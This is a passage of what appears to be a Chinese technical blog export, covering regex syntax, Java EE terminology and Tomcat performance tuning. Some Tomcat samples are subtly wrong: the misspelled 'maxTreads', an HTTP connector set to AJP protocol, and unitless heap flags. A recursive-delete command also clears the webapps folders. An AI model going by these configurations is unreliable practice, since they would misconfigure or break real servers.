匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。 * 匹配前面的子表达式零次或多次。要匹配 字符，请使用 \。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。 . 匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 \[。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。 \ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\\’ 匹配 “\“，而 ‘\(‘ 则匹配 “(“。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。 { 标记限定符表达式的开始。要匹配 {，请使用 \{。 \ 指明两项之间的一个选择。要匹配 \ ，请使用 \\ 。 限定符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有*或+或?或{n}或{n,}或{n,m}共6种。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo 能匹配 “z” 以及 “zoo”。 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于章节编号在大的输入文档中会很可能超过九，所以需要一种方式来处理两位或三位章节编号。限定符有这种能力。下面的正则表达式匹配编号为任何位数的章节标题： 1/Chapter [1-9][0-9]*/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，限定符出现在范围表达式之后。因此，它应用于整个范围表达式，在本例中，只指定从 0 到 9 的数字（包括 0 和 9）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里不使用 + 限定符，因为在第二个位置或后面的位置不一定需要有一个数字。也不使用？字符，因为它将章节编号限制到只有两位数。您需要至少匹配 Chapter 和空格字符后面的一个数字。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果知道章节编号被限制为只有 99 章，可以使用下面的表达式来至少指定一位但至多两位数字。 1/Chapter [0-9]&#123;1,2&#125;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的表达式的缺点是，大于 99 的章节编号仍只匹配开头两位数字。另一个缺点是 Chapter 0 也将匹配。只匹配两位数字的更好的表达式如下： 1/Chapter [1-9][0-9]?/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 1/Chapter [1-9][0-9]&#123;0,1&#125;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，可能搜索 HTML 文档，以查找括在 H1 标记内的章节标题。该文本在文档中如下： 1&lt;H1&gt;Chapter 1 - 介绍正则表达式&lt;/H1&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;贪婪：下面的表达式匹配从开始小于符号 (&lt;) 到关闭 H1 标记的大于符号 (&gt;) 之间的所有内容。 1/&lt;.*&gt;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;非贪婪：如果只需要匹配开始和介绍 H1 标记，下面的非贪婪表达式只匹配 。 1/&lt;.*?&gt;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果只想匹配开始的 H1 标签，表达式则是： 1/&lt;\w+?&gt;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过在 *、+ 或 ? 限定符之后放置 ?，该表达式从”贪心”表达式转换为”非贪心”表达式或者最小匹配。 定位符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定位符能够将正则表达式固定到行首或行尾。它们还能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，span class=”marked”&gt;\b 描述单词的前或后边界，span class=”marked”&gt;\B 表示非单词边界。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式的限定符有： 字符 描述 ^ 匹配输入字符串开始的位置。如果设置了RegExp对象的Multiline属性，^还会与\n或\r之后的位置匹配 $ 匹配输入字符串结尾的位置。如果设置了RegExp对象的Multiline属性，$还回与\n或\r之前的位置匹配 \b 匹配一个字边界，即字与空格间的位置 \B 非字边界匹配 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：不能将限定符与定位点一起使用。由于在紧靠换行或者字边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要匹配一行文本开始处的文本，请在正则表达式的开始使用 ^ 字符。不要将 ^ 的这种用法与中括号表达式内的用法混淆。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 $字符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该标题只包含两个尾随数字，并且出现在行首： 1/^Chapter [1-9][0-9]&#123;0,1&#125;/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它即出现在行首又出现在同一行的结尾。下面的表达式能确保指定的匹配只匹配章节而不匹配交叉引用。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点。 1/^Chapter [1-9][0-9]&#123;0,1&#125;$/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;匹配字边界稍有不同，但向正则表达式添加了很重要的能力。字边界是单词和空格之间的位置。非字边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现字边界后面： 1/\bCha/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在字边界的前面： 1/ter\b/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt： 1/\Bapt/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字符串 apt 出现在单词 Chapter 中的非字边界处，但出现在单词 aptitude 中的字边界处。对于 \B 非字边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。 选择&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，是相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中 ?: 是非捕获元之一，还有两个非捕获元是 ?= 和 ?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。 反向引用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \n 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用非捕获元字符 ?:、?= 或 ?! 来重写捕获，忽略对相关匹配的保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向引用的最简单的、最有用的应用之一，是提供查找文本中两个相同的相邻单词的匹配项的能力。以下面的句子为例： 1Is is the cost of of gasoline going up up? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的句子很显然有多个重复的单词。如果能设计一种方法定位该句子，而不必查找每个单词的重复出现，那该有多好。下面的正则表达式使用单个子表达式来实现这一点： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找重复的单词： 123var str = "Is is the cost of of gasoline going up up";var patt1 = /\b([a-z]+) \1\b/;document.write(str.match(patt1)); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;捕获的表达式，正如 [a-z]+ 指定的，包括一个或多个字母。正则表达式的第二部分是对以前捕获的子匹配项的引用，即，单词的第二个匹配项正好由括号表达式匹配。\1 指定第一个子匹配项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;字边界元字符确保只检测整个单词。否则，诸如 “is issued” 或 “this is” 之类的词组将不能正确地被此表达式识别。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正则表达式后面的全局标记 g 指定将该表达式应用到输入字符串中能够查找到的尽可能多的匹配。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表达式的结尾处的不区分大小写 i 标记指定不区分大小写。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多行标记指定换行符的两边可能出现潜在的匹配。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;反向引用还可以将通用资源指示符 (URI) 分解为其组件。假定您想将下面的 URI 分解为协议（ftp、http 等等）、域地址和页/路径： 1http://www.runoob.com:80/html/html-tutorial.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的正则表达式提供该功能： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出所有匹配的数据： 1234567var str = "https://www.runoob.com:80/html/html-tutorial.html";var patt1 = /(\w+):\/\/([^/:]+)(:\d*)?([^# ]*)/;arr = str.match(patt1);for (var i = 0; i &lt; arr.length ; i++) &#123; document.write(arr[i]); document.write("&lt;br&gt;");&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一个括号子表达式捕获 Web 地址的协议部分。该子表达式匹配在冒号和两个正斜杠前面的任何单词。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二个括号子表达式捕获地址的域地址部分。子表达式匹配 / 和 : 之外的一个或多个字符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三个括号子表达式捕获端口号（如果指定了的话）。该子表达式匹配冒号后面的零个或多个数字。只能重复一次该子表达式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，第四个括号子表达式捕获 Web 地址指定的路径和 / 或页信息。该子表达式能匹配不包括 # 或空格字符的任何字符序列。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将正则表达式应用到上面的 URI，各子匹配项包含下面的内容： 第一个括号子表达式包含”http” 第二个括号子表达式包含”www.runoob.com” 第三个括号子表达式包含”:80” 第四个括号子表达式包含”/html/html-tutorial.html”]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[j2ee、j2se、ejb、javabean、serverlet、jsp之间关系]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F4.%20j2ee%E3%80%81j2se%E3%80%81ejb%E3%80%81javabean%E3%80%81serverlet%E3%80%81jsp%E4%B9%8B%E9%97%B4%E5%85%B3%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[j2ee、j2se、ejb、javabean、serverlet、jsp之间关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;j2ee：这个东西代表两个不同的东西，一种是sun的一种服务器软件，注意是一种具体的软件，不是技术。另一种是泛指sun的java技术，包括jsp,servlet,javabean,ejb等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;j2se:我所知道的，sun的jdk有专门for电子设备的版本，叫j2me,用来开发手机,pda等应用，j2se则是为计算机用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;javabean:通俗的讲，就是封装了好多function的类,用来被别的jsp,servlet等调用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ejb: 更通俗的讲，可以让你的javabean分布在多台计算机上以供你调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;servlet: 用来通过http协议与用户交互 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;jsp: servlet的UI设计太差，jsp可以实现更方便的UI设计。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;struts: jsp把网页和代码混在一起，太乱，于是出了个struts可以帮你把jsp的UI和逻辑部分分开处理。]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat 的优化配置]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F8.%20tomcat%20%E7%9A%84%E4%BC%98%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[tomcat 的优化配置一、精简Tomcat和配置文件1．删除不需要的管理应用和帮助应用，提高tomcat安全性。 删除webapps下所有文件 1rm –fr $CATALINA_HOME/webapps/* 删除server/wenapps下所有文件 1rm –fr $CATALINA_HOME/server/webapps/* 2．精简sever.xml配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用tomcat发布版本中的最小配置文件，提高性能，如果有功能上的需求，在逐个的加入功能配置。 备份原来的server.xml为server.xml_bak 1mv server.xml server.xml_bak 复制server-minimal.xml为server.xml 1cp server-minimal.xml server.xml 二、连接器优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在$CATALINA_HOME/conf/server.xml配置文件中的Connetctor节点，和连接数相关的参数配置和优化。 maxThreads&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat使用线程来处理接收的每个请求。这个值表示Tomcat可创建的最大的线程数。默认值200。 可以根据机器的时期性能和内存大小调整，一般可以在400-500。最大可以在800左右。 acceptCount&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理。默认值10。 minSpareThreads&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat初始化时创建的线程数。默认值4。 maxSpareThreads&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程。默认值50。 enableLookups&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否反查域名，默认值为true。为了提高处理能力，应设置为false connnectionTimeout&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网络连接超时，默认值20000，单位：毫秒。设置为0表示永不超时，这样设置有隐患的。通常可设置为30000毫秒。(本系统由于与后台系统接口超时时间较长，使用设置为60000) maxKeepAliveRequests&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保持请求数量，默认值100。 bufferSize&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入流缓冲大小，默认值2048 bytes。 compression&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩传输，取值on/off/force，默认值off。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中和最大连接数相关的参数为maxThreads和acceptCount。如果要加大并发连接数，应同时加大这两个参数。web server允许的最大连接数还受制于操作系统的内核参数设置，通常Windows是2000个左右，Linux是1000个左右。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat中如何禁止和允许列目录下的文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在$CATALINA_HOME/conf/web.xml中，把listings参数设置成false即可，如下： 123listingsfalse... 具体操作1vi $CATALINA_HOME/conf/server.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改用于AJP的连接： 1&lt;Connector port="8009" protocol="AJP/1.3" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为： 1234&lt;Connector port="8009" maxTreads="500" minSpareThreads="10" maxSpareThreads="50" acceptCount="50" connectionTimeout="60000" enableLookups="false" redirectPort="8443" protocol="AJP/1.3" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改通用连接： 1&lt;Connector port="8080" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为： 12345678&lt;Connector port="8080" maxTreads="500" minSpareThreads="10" maxSpareThreads="50" acceptCount="50" connectionTimeout="60000" enableLookups="false" redirectPort="8443" protocol="AJP/1.3" compression="on" compressionMinSize="2048" noCompressionUserAgents="gozilla, traviata" compressableMimeType="text/html,text/xml"/&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改主机和应用配置： 1&lt;Host name="localhost" appBase="webapps" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为： 12345&lt;Host name="localhost" appBase=" " unpackWARs="true" autoDeploy="true" xmlValidation="false" xmlNamespaceAware="false"&gt; &lt;Context path="" docBase="/www/xxxx/site/web" reloadable="true" debug="0"/&gt; &lt;/Host&gt; 三、优化JDK&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tomcat默认可以使用的内存为128MB,Windows下,在文件{tomcat_home}/bin/catalina.bat，Unix下，在文件$CATALINA_HOME/bin/catalina.sh的前面，增加如下设置： 1JAVA_OPTS='$JAVA_OPTS -Xms[初始化内存大小] -Xmx[可以使用的最大内存] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或设置环境变量： 1export JAVA_OPTS=”$JAVA_OPTS -Xms[初始化内存大小] -Xmx[可以使用的最大内存]” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般说来，你应该使用物理内存的 80% 作为堆大小。如果本机上有Apache服务器，可以先折算Apache需要的内存，然后修改堆大小。建议设置为70％；建议设置[[初始化内存大小]等于[可以使用的最大内存]，这样可以减少平凡分配堆而降低性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本例使用加入环境变量的方式： 1vi /etc/profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入： 1export JAVA_OPTS=”$JAVA_OPTS -Xms700 –Xmx700 1source /etc/profile]]></content>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式-元字符]]></title>
    <url>%2F2017%2F08%2F10%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F3.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%83%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[正则表达式-元字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下标包含了元字符的完整列表以及他们在正则表达式上下文中的行为： 字符 描述 \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo 能匹配 “z” 以及 “zoo”。 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 . 匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像”(. \n)”的模式。 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 ( ) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y ies) 就是一个比 ‘industry industries’ 更简略的表达式。 (?=pattern) 正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95 98 NT 2000)’ 能匹配 “Windows 2000” 中的 “Windows” ，但不能匹配 “Windows 3.1” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95 98 NT 2000)’ 能匹配 “Windows 3.1” 中的 “Windows”，但不能匹配 “Windows 2000” 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 x\ y 匹配 x 或 y。例如，’z food’ 能匹配 “z” 或 “food”。’(z f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \B 匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \cx 匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \d 匹配一个数字字符。等价于 [0-9]。 \D 匹配一个非数字字符。等价于 [^0-9]。 \f 匹配一个换页符。等价于 \x0c 和 \cL。 \n 匹配一个换行符。等价于 \x0a 和 \cJ。 \r 匹配一个回车符。等价于 \x0d 和 \cM。 \s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。 \S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 \t 匹配一个制表符。等价于 \x09 和 \cI。 \v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 \w 匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。 \W 匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。 \xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。 \num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。 \n 标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \nm 标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。 \nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tomcat 性能优化]]></title>
    <url>%2F2017%2F08%2F10%2FTomcat%2F9.%20tomcat%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[tomcat 性能优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat默认参数是为开发环境制定，而非适合生产环境，尤其是内存和线程的配置，默认都很低，容易成为性能瓶颈。 tomcat内存优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux修改TOMCAT_HOME/bin/catalina.sh，在前面加入 1JAVA_OPTS="-XX:PermSize=64M -XX:MaxPermSize=128m -Xms512m -Xmx1024m -Duser.timezone=Asia/Shanghai" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;windows修改TOMCAT_HOME/bin/catalina.bat，在前面加入 1set JAVA_OPTS=-XX:PermSize=64M -XX:MaxPermSize=128m -Xms512m -Xmx1024m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最大堆内存是1024m，对于现在的硬件还是偏低，实施时，还是按照机器具体硬件配置优化。 tomcat 线程优化123456&lt;Connector port="80" protocol="HTTP/1.1" maxThreads="600" minSpareThreads="100" maxSpareThreads="500" acceptCount="700"connectionTimeout="20000" redirectPort="8443" /&gt;maxThreads="600" ///最大线程数minSpareThreads="100"///初始化时创建的线程数maxSpareThreads="500"///一旦创建的线程超过这个值，Tomcat就会关闭不再需要的socket线程。acceptCount="700"//指定当所有可以使用的处理请求的线程数都被使用时，可以放到处理队列中的请求数，超过这个数的请求将不予处理 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里是http connector的优化，如果使用apache和tomcat做集群的负载均衡，并且使用ajp协议做apache和tomcat的协议转发，那么还需要优化ajp connector。 12&lt;Connector port="8009" protocol="AJP/1.3" maxThreads="600" minSpareThreads="100" maxSpareThreads="500" acceptCount="700"connectionTimeout="20000" redirectPort="8443" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于tomcat有多个connector，所以tomcat线程的配置，又支持多个connector共享一个线程池。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先。打开/conf/server.xml，增加 1&lt;Executor name="tomcatThreadPool" namePrefix="catalina-exec-" maxThreads="500" minSpareThreads="20" maxIdleTime="60000" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最大线程500（一般服务器足以），最小空闲线程数20，线程最大空闲时间60秒。 然后，修改节点，增加executor属性，executor设置为线程池的名字： 1&lt;Connector executor="tomcatThreadPool" port="80" protocol="HTTP/1.1" connectionTimeout="60000" keepAliveTimeout="15000" maxKeepAliveRequests="1" redirectPort="443" /&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以多个connector公用1个线程池，所以ajp connector也同样可以设置使用tomcatThreadPool线程池。 禁用DNS查询&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当web应用程序向要记录客户端的信息时，它也会记录客户端的IP地址或者通过域名服务器查找机器名 转换为IP地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS查询需要占用网络，并且包括可能从很多很远的服务器或者不起作用的服务器上去获取对应的IP的过程，这样会消耗一定的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改server.xml文件中的Connector元素，修改属性enableLookups参数值: enableLookups=”false” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果为true，则可以通过调用request.getRemoteHost()进行DNS查询来得到远程客户端的实际主机名，若为false则不进行DNS查询，而是返回其ip地址 设置session过期时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;conf\web.xml中通过参数指定： 123&lt;session-config&gt; &lt;session-timeout&gt;180&lt;/session-timeout&gt; &lt;/session-config&gt; 